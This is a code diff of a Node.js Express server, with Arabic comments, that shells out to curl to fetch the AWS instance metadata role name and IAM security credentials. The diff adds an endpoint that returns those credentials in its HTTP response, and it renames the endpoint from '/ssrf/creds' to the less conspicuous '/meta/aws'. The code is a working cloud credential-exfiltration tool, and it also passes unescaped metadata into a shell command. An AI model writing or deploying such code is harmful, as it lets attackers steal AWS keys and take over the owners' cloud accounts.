@@ -3,39 +3,46 @@ const { exec } = require("child_process");
 const app = express();
 const PORT = 10000;
 
-// خطوة 1: استخراج اسم الدور (IAM Role)
+// استخراج اسم الدور (IAM Role)
 function getIAMRole(callback) {
-  const cmd = `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
+  const cmd = `curl -m 2 -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
   exec(cmd, (err, stdout) => {
     if (err || !stdout.trim()) return callback(null);
     callback(stdout.trim());
   });
 }
 
-// خطوة 2: استخراج الـ credentials باستخدام اسم الدور
-function getIAMCredentials(role) {
+// استخراج الـ credentials باستخدام اسم الدور
+function getIAMCredentials(role, callback) {
   const credsURL = `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`;
-  const cmd = `curl -s "${credsURL}"`;
+  const cmd = `curl -m 2 -s "${credsURL}"`;
   exec(cmd, (err, stdout) => {
     if (err || !stdout) {
-      console.error("❌ Failed to extract credentials");
+      callback(null);
     } else {
-      console.log("✅ IAM Credentials:\n", stdout);
+      callback(stdout);
     }
   });
 }
 
-// مسار SSRF trigger
-app.get("/ssrf/creds", (req, res) => {
+// SSRF endpoint الجديد
+app.get("/meta/aws", (req, res) => {
   getIAMRole((role) => {
     if (!role) {
-      res.send("❌ Could not fetch IAM Role");
+      res.send("❌ No IAM Role found (maybe not AWS or blocked).");
       return;
     }
 
     console.log("🔐 IAM Role:", role);
-    getIAMCredentials(role);
-    res.send(`<h1>🧨 Trying to extract AWS credentials for role: ${role}</h1>`);
+
+    getIAMCredentials(role, (creds) => {
+      if (!creds) {
+        res.send(`🧨 IAM Role found (${role}) but credentials not returned.`);
+      } else {
+        console.log("✅ IAM Credentials:\n", creds);
+        res.send(`<pre>${creds}</pre>`);
+      }
+    });
   });
 });
 
